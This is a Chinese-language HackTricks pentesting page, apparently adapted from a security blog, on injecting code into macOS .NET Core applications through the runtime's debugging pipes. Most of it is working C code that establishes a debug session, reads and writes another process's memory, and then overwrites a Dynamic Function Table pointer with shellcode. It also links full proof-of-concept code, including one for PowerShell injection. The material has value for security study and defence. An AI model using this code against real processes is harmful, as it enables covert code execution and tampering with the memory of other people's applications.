# macOS .Net 应用程序注入

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 如果您在**网络安全公司**工作？您想在**HackTricks**中看到您的**公司广告**吗？或者您想要访问**PEASS的最新版本或下载HackTricks的PDF**？查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

## .NET Core 调试 <a href="#net-core-debugging" id="net-core-debugging"></a>

### **建立调试会话** <a href="#net-core-debugging" id="net-core-debugging"></a>

[**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) 负责处理调试器到被调试者的**通信**。
它通过调用 [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) 在 [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127) 创建了每个.Net进程的2个命名管道（一个以**`-in`** 结尾，另一个以 **`-out`** 结尾，其余名称相同）。

因此，如果您转到用户的 **`$TMPDIR`**，您将能够找到可以用来调试.Net应用程序的**调试fifo**：

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

函数 [**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) 将处理来自调试器的通信。

调试器需要做的第一件事是**创建一个新的调试会话**。这是通过**通过`out`管道发送消息**开始的，消息以`MessageHeader`结构开始，我们可以从.NET源码中获取：
```c
struct MessageHeader
{
MessageType   m_eType;        // Type of message this is
DWORD         m_cbDataBlock;  // Size of data block that immediately follows this header (can be zero)
DWORD         m_dwId;         // Message ID assigned by the sender of this message
DWORD         m_dwReplyId;    // Message ID that this is a reply to (used by messages such as MT_GetDCB)
DWORD         m_dwLastSeenId; // Message ID last seen by sender (receiver can discard up to here from send queue)
DWORD         m_dwReserved;   // Reserved for future expansion (must be initialized to zero and
// never read)
union {
struct {
DWORD         m_dwMajorVersion;   // Protocol version requested/accepted
DWORD         m_dwMinorVersion;
} VersionInfo;
...
} TypeSpecificData;

BYTE                    m_sMustBeZero[8];
}
```
在新会话请求的情况下，此结构体按如下方式填充：
```c
static const DWORD kCurrentMajorVersion = 2;
static const DWORD kCurrentMinorVersion = 0;

// Set the message type (in this case, we're establishing a session)
sSendHeader.m_eType = MT_SessionRequest;

// Set the version
sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;

// Finally set the number of bytes which follow this header
sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
```
一旦构建完成，我们使用 `write` 系统调用**将其发送给目标**：
```c
write(wr, &sSendHeader, sizeof(MessageHeader));
```
遵循我们的标题，我们需要发送一个 `sessionRequestData` 结构体，其中包含一个 GUID 来识别我们的会话：
```c
// All '9' is a GUID.. right??
memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));

// Send over the session request data
write(wr, &sDataBlock, sizeof(SessionRequestData));
```
在发送我们的会话请求后，我们**从`out`管道读取一个头部**，该头部将指示我们的请求是否成功地建立了一个调试器会话：
```c
read(rd, &sReceiveHeader, sizeof(MessageHeader));
```
### 读取内存

在建立了调试会话后，可以使用消息类型 [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896) 来**读取内存**。要读取一些内存，主要需要的代码将是：
```c
bool readMemory(void *addr, int len, unsigned char **output) {

*output = (unsigned char *)malloc(len);
if (*output == NULL) {
return false;
}

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_ReadMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to read from
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = 0;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Make sure that memory could be read before we attempt to read further
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

memset(*output, 0, len);

// Read the memory from the debugee
if (read(rd, *output, sReceiveHeader.m_cbDataBlock) < 0) {
return false;
}

return true;
}
```
概念验证（POC）代码可在[此处](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b)找到。

### 写内存
```c
bool writeMemory(void *addr, int len, unsigned char *input) {

sSendHeader.m_dwId++; // We increment this for each request
sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
sSendHeader.m_eType = MT_WriteMemory; // The type of request we are making
sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to write to
sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
sSendHeader.m_cbDataBlock = len;

// Write the header
if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Write the data
if (write(wr, input, len) < 0) {
return false;
}

// Read the response header
if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
return false;
}

// Ensure our memory write was successful
if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
return false;
}

return true;

}
```
POC 代码可以在[这里](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5)找到。

### .NET Core 代码执行 <a href="#net-core-code-execution" id="net-core-code-execution"></a>

首先要做的是例如识别一个具有 **`rwx`** 权限的内存区域来保存要运行的 shellcode。这可以很容易地完成：
```bash
vmmap -pages [pid]
vmmap -pages 35829 | grep "rwx/rwx"
```
然后，为了触发执行，需要知道存储函数指针的某个位置以便覆盖它。可以覆盖 **Dynamic Function Table (DFT)** 中的指针，.NET Core 运行时使用它来为 JIT 编译提供帮助函数。可以在 [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h) 中找到支持的函数指针列表。

在 x64 版本中，使用 mimikatz 式的 **signature hunting** 技术搜索 **`libcorclr.dll`** 中对符号 **`_hlpDynamicFuncTable`** 的引用是直接的，我们可以解引用：

<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

剩下的就是找到一个地址来开始我们的签名搜索。为此，我们利用另一个暴露的调试器函数，**`MT_GetDCB`**。这返回了目标进程的许多有用信息，但对我们来说，我们感兴趣的是返回的包含 **帮助函数地址** 的字段，**`m_helperRemoteStartAddr`**。使用这个地址，我们就知道 **`libcorclr.dll`** 在目标进程内存中的位置，我们可以开始搜索 DFT。

知道这个地址后，就可以用我们的 shellcode 替换函数指针。

用于注入 PowerShell 的完整 POC 代码可以在[这里](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6)找到。

## 参考资料

* 这项技术取自 [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 如果你在 **网络安全公司** 工作？你想在 **HackTricks** 中看到你的 **公司广告**？或者你想访问 **PEASS 的最新版本或下载 HackTricks 的 PDF**？查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 系列。
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 上 **关注** 我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* 通过向 [**hacktricks repo**](https://github.com/carlospolop/hacktricks) 和 [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来 **分享你的黑客技巧**。

</details>
